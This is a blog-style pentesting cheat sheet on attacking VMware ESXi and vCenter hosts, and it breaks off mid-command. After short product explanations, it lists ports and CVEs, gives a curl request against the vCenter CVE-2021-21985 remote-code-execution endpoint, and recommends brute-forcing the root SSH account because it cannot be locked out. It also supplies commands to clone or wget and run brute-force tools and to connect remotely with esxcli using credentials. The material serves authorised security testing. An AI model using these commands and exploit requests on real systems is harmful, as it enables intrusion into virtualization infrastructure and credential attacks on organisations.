---
title: Attacking and Pentesting VMWare ESXi Hosts
url: https://www.hackingdream.net/2023/08/attacking-and-pentesting-vmware-esxi.html
source: Hacking Dream
date: 2023-08-12
fetch_date: 2025-10-04T12:00:44.185399
---

# Attacking and Pentesting VMWare ESXi Hosts

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Attacking and Pentesting VMWare ESXi Hosts

[August 11, 2023](https://www.hackingdream.net/2023/08/attacking-and-pentesting-vmware-esxi.html "permanent link")

Before getting into the Attacking and Exploitation, it is recommended to know the difference between vSphere, vCenter and ESXI/ESX hosts.

**VMware vSphere:** VMware vSphere is the name given for the comprehensive virtualization platform that includes multiple software products and tools for creating, managing, and running virtual machines (VMs) on a physical server. It provides features like resource management, high availability, and centralized management.

**vCenter Server:** vCenter Server is a key component of the vSphere platform. It serves as a centralized management system that enables administrators to control and monitor multiple ESXi hosts and VMs. It offers features like VMotion, Distributed Resource Scheduler (DRS), and centralized management of virtual infrastructure.

**ESXi (VMware vSphere Hypervisor):** ESXi is a bare-metal hypervisor, which is a type 1 hypervisor installed directly on the physical server hardware. It provides the foundation for running VMs by managing the physical resources of the host, such as CPU, memory, storage, and networking, while also supporting features like vMotion and High Availability (HA). ESXi hosts are like a normal vmware or virual box that we usually setup locally - it enables users to create VM's on demand. On the other hand, vCenter Server is a management console which has the capability to control/manage Multiple ESXi hosts at once.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhm3_Nsm8cjUTmoHK7kZ4jUv2YJ_vD8PI2bc5acFb7mO0r7ZdYQGAhHApuWhjy0a05-1iDgqYz94J1wMUhggtlGdG0cPP-Dl310XVcyPC5mu1SwfT4POi43NZbC7CGSVcjcOlp0NAl_DrDRoL2mevgWBKHlfmhyKpehtestRc3jkjVsj8cklwP41goSOoFh/w640-h189/vmware%20esxi.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhm3_Nsm8cjUTmoHK7kZ4jUv2YJ_vD8PI2bc5acFb7mO0r7ZdYQGAhHApuWhjy0a05-1iDgqYz94J1wMUhggtlGdG0cPP-Dl310XVcyPC5mu1SwfT4POi43NZbC7CGSVcjcOlp0NAl_DrDRoL2mevgWBKHlfmhyKpehtestRc3jkjVsj8cklwP41goSOoFh/s1400/vmware%20esxi.png)

```
Reference Links

1. Soap API Guide
2. Ports and Services
3. Vcenter Security Guide  ESXi Security
4. REST VAPI-HTTP Queries
5. vAPI REST API - New

Techniques

1. CVE-2021-21974 Exploit
2. VMware ESXi Zero-Day Used by Chinese Espionage Actor to Perform Privileged Guest Operations on Compromised Hypervisors | Mandiant
3. Zero Day Initiative â€” CVE-2020-3992 & CVE-2021-21974: Pre-Auth Remote Code Execution in VMware ESXi
```

```
Common Ports

22 - SSH Access to ESXi Host
161 - SNMP
80, 443 - ESXi Web Server, Client connector/ ESXi Host Client
902 - VMware Authentication Daemon
3260 - iscsi
5989 - CIM Broker
8000 - ESXi hosts listen on port 8000 for TCP connections from remote ESXi hosts for vMotion traffic
8080 - Used by the Storage Management Service (SMS) that is part of vCenter to access information about Virtual SAN storage profiles, capabilities, and compliance.
8889 - WS-Management for SOAP
8083, 9080, 8182, 8300, 9080, 9999 - vAPI-PicoHttp Service
```

```
Basics

- Look for the Fingerprint on Port 443 and 80 to get the ESXi Version
- See if Port 22 is enabled - Can be used to login to ESXi Shell (Default Username is root and cannot be locked out - bruteforce it)
- SSO can be enabled for the login
- To use ESXCLI, you need vCenter Server Root Certificate, you can download it if you know the address.
- Check the ESXi Host Certificates for vCenter Server address, from which you can download the certificate.
- Check for servers below 7.0.3u (Multiple Vulnerabilities)
- curl -kL https://esxi.fqdn/host -v - all the hosts for host endpoint
- Check if TCP port 427 is open for any server - SLP Service, After the patch of CVE-2020-3992 and CVE-2021-21974, SLP service is only accessible from local (127.0.0.1(ipv4) or::1(ipv6))
```

```
CVE's

CVE-2019-5544(heap buffer overflow)

CVE-2020-3992(use after free)

CVE-2021-21974(heap buffer overflow)

CVE-2022-31699(heap buffer overflow)=
```

```
VMware vCenter Server CVE-2021-21985 Remote Code Execution Vulnerability

curl -s -k -X $'POST' -H 'Host: <target>' -H 'User-Agent: curl'
-H 'Content-Type: application/json'
-H 'Connection: close'
--data-binary $'{\"methodInput\":[{\"type\":\"ClusterComputeResource\",\"value\": null,\"serverGuid\": null}]}\x0d\x0a' https://esxi.fqdn/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
```

```
Testing VMWARE API Access - Port 443

go to https://github.com/Bhanunamikaze/VMwareAPIPentest or
git clone https://github.com/Bhanunamikaze/VMwareAPIPentest.git

#Run below command to run a set of predefined queries against given set of hosts to check the authentication status of the API's
ESXi_Soap_Pentest.py hosts.txt output.txt

#if you want to test the queries manually - you can find the soap queries here
raw.githubusercontent.com/Bhanunamikaze/VMwareAPIPentest/main/Soap_Queries.xml
```

```
Access ESXi Hosts Remotely

Register and download esxcli from here - esxcli works only from ESXi 7.0 Version

Basic Commands:

# Accessing using config file
# Save the below contents into a file and use it as -config
VI_PSC = XX.XXX.XXX.XX
VI_USERNAME = administrator@vsphere.local
VI_PASSWORD = admin_password
VI_PROTOCOL = https
VI_SERVER = my_vc

Example:
esxcli --config <my_saved_config> network ip interface list
esxcli -s 10.10.10.10 --cacertsfile cert.0

# Allin Command Line
esxcli --server <vc_hostname_or_IP> --username <privileged_user> --password <password> --vihost
<esxi_hostname_or_IP> <namespace> [<namespace]...> <command> --<option_name=option_value>
```

```
Bruteforce ESXI Hosts

 pip install pyVim
 git clone https://github.com/Bhanunamikaze/ESXiBrute.git
 cd ESXiBrute
 python ESXi_Brute.py --hosts hosts.txt --usernames usernames.txt --passwords passwords.txt --cert cert.pem [--output output.csv]

Reference: ESXiBrute

Note: You can find the certificate from VMWare vCenter UI (You can find vCenter IP Address/Hostname from ESXi HTTPS Certificate - Port 443)
```

```
Bruteforce ESXi Hosts if you dont have Cert/Hostname

Download and Install VMware vSphere Resxtop - VMware {code}

# Add the library to PATH
export LD_LIBRARY_PATH=/usr/lib/vmware/resxtop/

wget raw.githubusercontent.com/Bhanunamikaze/ESXiBrute/main/Resxtop_Brute.sh

chmod +x Resxtop_Brute.sh
./Resxtop_Brute...